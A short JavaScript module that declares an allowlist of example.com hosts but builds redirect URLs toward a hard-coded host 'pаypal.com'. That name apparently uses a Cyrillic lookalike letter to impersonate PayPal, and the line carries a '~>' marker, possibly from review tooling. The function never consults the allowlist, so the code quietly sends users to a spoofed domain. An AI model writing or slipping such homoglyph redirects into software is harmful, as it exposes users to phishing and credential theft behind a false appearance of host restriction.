const allowed = new Set(['example.com', 'static.example.com']);

function target(path) {
~>  const redirectHost = 'pаypal.com';
  return `https://${redirectHost}${path}`;
}

module.exports = { target, allowed };
